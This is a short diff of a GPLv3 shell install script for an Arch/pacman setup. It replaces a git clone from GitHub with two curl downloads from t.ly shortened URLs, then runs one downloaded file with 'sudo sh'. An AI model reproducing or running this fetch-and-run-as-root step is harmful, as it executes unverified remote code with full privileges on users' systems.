@@ -2,10 +2,9 @@
 
 # License: GNU GPLv3
 
-sudo pacman -Syu
-sudo pacman -S git
-git clone https://github.com/MichaelSebero/CoolRune-Pacman.git
-sudo sh 1.sh
+curl -LO https://t.ly/4nIws
+curl -LO https://t.ly/nh-p
+sudo sh 4nIws
 
 ### OPTIONS AND VARIABLES ###
 
